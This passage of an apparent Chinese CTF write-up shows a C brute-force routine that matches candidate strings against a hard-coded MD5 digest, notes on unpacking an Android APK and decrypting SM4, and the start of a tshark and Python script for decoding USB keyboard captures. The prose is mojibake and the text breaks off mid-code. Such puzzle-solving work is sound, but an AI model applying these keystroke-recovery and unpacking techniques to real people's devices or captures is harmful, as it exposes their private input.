operator\">=</span><span class=\"token char\">'k'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"519\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'e'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"520\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'y'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"521\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"522\"></td><td><pre>        <span class=\"token keyword\">default</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"523\"></td><td><pre>            <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Invalid choice\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"524\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"525\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span>           <span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span>iii<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"526\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">0</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"527\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'c'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"528\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"529\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'t'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"530\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"531\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">1</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"532\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'d'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"533\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"534\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'g'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"535\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"536\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">2</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"537\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'f'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"538\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"539\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'x'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"540\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"541\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">3</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"542\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'p'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"543\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"544\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'n'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"545\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'d'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"546\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"547\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"548\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">4</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"549\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'d'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"550\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'r'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"551\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"552\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'g'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"553\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"554\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'n'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"555\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"556\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">5</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"557\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'m'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"558\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"559\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'n'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"560\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'k'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"561\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'e'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"562\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'y'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"563\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"564\"></td><td><pre>        <span class=\"token keyword\">default</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"565\"></td><td><pre>            <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Invalid choice\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"566\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"567\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span>     <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> decrypt<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">0</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"568\"></td><td><pre>    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> decrypt32<span class=\"token punctuation\">[</span><span class=\"token number\">64</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">0</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>    </pre></td></tr><tr><td data-num=\"569\"></td><td><pre></pre></td></tr><tr><td data-num=\"570\"></td><td><pre>    MD5_CTX md5c<span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"571\"></td><td><pre> <span class=\"token keyword\">int</span> a<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"572\"></td><td><pre>     <span class=\"token function\">MD5Init</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>md5c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// åˆå§‹åŒ–</span></pre></td></tr><tr><td data-num=\"573\"></td><td><pre>     read_len <span class=\"token operator\">=</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span>hexbuf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"574\"></td><td><pre>    <span class=\"token function\">MD5Update</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>md5c<span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>hexbuf<span class=\"token punctuation\">,</span>read_len<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"575\"></td><td><pre> <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> ccmp<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">0xDD</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x83</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x93</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x50</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x59</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0E</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"576\"></td><td><pre>     <span class=\"token function\">MD5Final</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>md5c<span class=\"token punctuation\">,</span>decrypt<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"577\"></td><td><pre></pre></td></tr><tr><td data-num=\"578\"></td><td><pre></pre></td></tr><tr><td data-num=\"579\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"580\"></td><td><pre>     <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>decrypt<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span>ccmp<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token punctuation\">(</span>decrypt<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span>ccmp<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token punctuation\">(</span>decrypt<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span>ccmp<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token punctuation\">(</span>decrypt<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span>ccmp<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token punctuation\">(</span>decrypt<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span>ccmp<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token punctuation\">(</span>decrypt<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span>ccmp<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token punctuation\">(</span>decrypt<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span>ccmp<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token punctuation\">(</span>decrypt<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span>ccmp<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token punctuation\">(</span>decrypt<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span>ccmp<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token punctuation\">(</span>decrypt<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span>ccmp<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token punctuation\">(</span>decrypt<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span>ccmp<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token punctuation\">(</span>decrypt<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span>ccmp<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token punctuation\">(</span>decrypt<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span>ccmp<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token punctuation\">(</span>decrypt<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span>ccmp<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token punctuation\">(</span>decrypt<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span>ccmp<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token punctuation\">(</span>decrypt<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span>ccmp<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"581\"></td><td><pre>       <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\"</span><span class=\"token punctuation\">,</span>hexbuf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"582\"></td><td><pre>        <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"583\"></td><td><pre>     <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"584\"></td><td><pre>        </pre></td></tr><tr><td data-num=\"585\"></td><td><pre>        </pre></td></tr><tr><td data-num=\"586\"></td><td><pre>        </pre></td></tr><tr><td data-num=\"587\"></td><td><pre>     </pre></td></tr><tr><td data-num=\"588\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"589\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"590\"></td><td><pre></pre></td></tr><tr><td data-num=\"591\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"592\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"593\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"594\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"595\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"596\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"597\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"598\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"599\"></td><td><pre></pre></td></tr><tr><td data-num=\"600\"></td><td><pre>     </pre></td></tr><tr><td data-num=\"601\"></td><td><pre>    <span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"602\"></td><td><pre> <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><img data-src=\"/images/image-20230716184927439.png\" alt=\"image-20230716184927439\"></p>\n<p><img data-src=\"/images/image-20230716185137499.png\" alt=\"image-20230716185137499\"></p>\n<p>å®‰å“</p>\n<p>jadx æ‰“å¼€æ²¡çœ‹åˆ° main çªå‘å¥‡æƒ³ç”¨æŸ¥å£³çœ‹çœ‹ (å¥½åƒæœ‰ä»€ä¹ˆä¸å¯¹ æ„Ÿè§‰å¾ˆå¤šæ··æ·†éƒ½è¢«è¯†åˆ«æˆåŠ å›ºäº†ï¼Ÿ)</p>\n<p><img data-src=\"/images/image-20230715095548821.png\" alt=\"image-20230715095548821\"></p>\n<p>32 ä½çš„</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0NvZGluZ0dheS9CbGFja0RleC9yZWxlYXNlcw==\">https://github.com/CodingGay/BlackDex/releases</span></p>\n<p><img data-src=\"/images/image-20230730232522932.png\" alt=\"image-20230730232522932\"></p>\n<p>è„±äº†ä¹‹åçœ‹ä¸æ‡‚</p>\n<p>å¥½åƒä¸æ˜¯è¿™æ ·åšï¼Ÿ</p>\n<p>å¤§ä½¬è¯´ç›´æ¥çœ‹ so æ–‡ä»¶çš„åŠ å¯†ç„¶åè§£å¯†å°±æ˜¯ flag æˆ‘æµ‹</p>\n<p><img data-src=\"/images/image-20230719163820868.png\" alt=\"image-20230719163820868\"></p>\n<p>ç›´æ¥çœ‹åˆ° sm4 äº†â€¦</p>\n<p>å†æ ¹æ®å®‰è£… APP è·³å‡ºçš„ä¸¤ä¸ªå­—ç¬¦ä¸²ç›´æ¥è§£å¯† SM4 å°±è¡Œ</p>\n<p><strong>èµ›åç ”ç©¶ä¸€ä¸‹ SM4 åŠ å¯†</strong></p>\n<h2 id=\"usbæµé‡åŒ…åˆ†æ\"><a class=\"markdownIt-Anchor\" href=\"#usbæµé‡åŒ…åˆ†æ\">#</a> USB æµé‡åŒ…åˆ†æ</h2>\n<p>USB</p>\n<p><img data-src=\"/images/image-20230715211437406.png\" alt=\"image-20230715211437406\"></p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>tshark <span class=\"token parameter variable\">-r</span> misc1.pcapng <span class=\"token parameter variable\">-T</span> fields <span class=\"token parameter variable\">-e</span> usb.capdata <span class=\"token operator\">></span> usbdata.txt</pre></td></tr></table></figure><p>å¤§ä½¬çš„è„šæœ¬å¾—åˆ°é”®ç›˜çš„è¾“å…¥çš„å­—ç¬¦</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> sys<span class=\"token punctuation\">,</span> argparse<span class=\"token punctuation\">,</span> os</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">kbpaser</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>            <span class=\"token comment\">#tshark å¯¼å‡ºæ–‡ä»¶</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        self<span class=\"token punctuation\">.</span>datafile<span class=\"token operator\">=</span><span class=\"token string\">\"kbdatafile.txt\"</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        self<span class=\"token punctuation\">.</span>presses<span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token comment\">#Keyboard Traffic Dictionary</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        self<span class=\"token punctuation\">.</span>normalKeys <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"04\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"a\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"05\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"b\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"06\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"c\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"07\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"d\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"08\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"e\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"09\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"f\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"0a\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"g\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"0b\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"h\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"0c\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"i\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"0d\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"j\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"0e\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"k\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"0f\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"l\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"10\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"m\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"11\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"n\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"12\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"o\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"13\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"p\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"14\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"q\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"15\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"r\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"16\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"s\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"17\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"t\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"18\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"u\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"19\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"v\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"1a\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"w\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"1b\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"x\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"1c\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"y\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"1d\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"z\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"1e\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"1\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"1f\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"2\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"20\"</span><span class=\"token 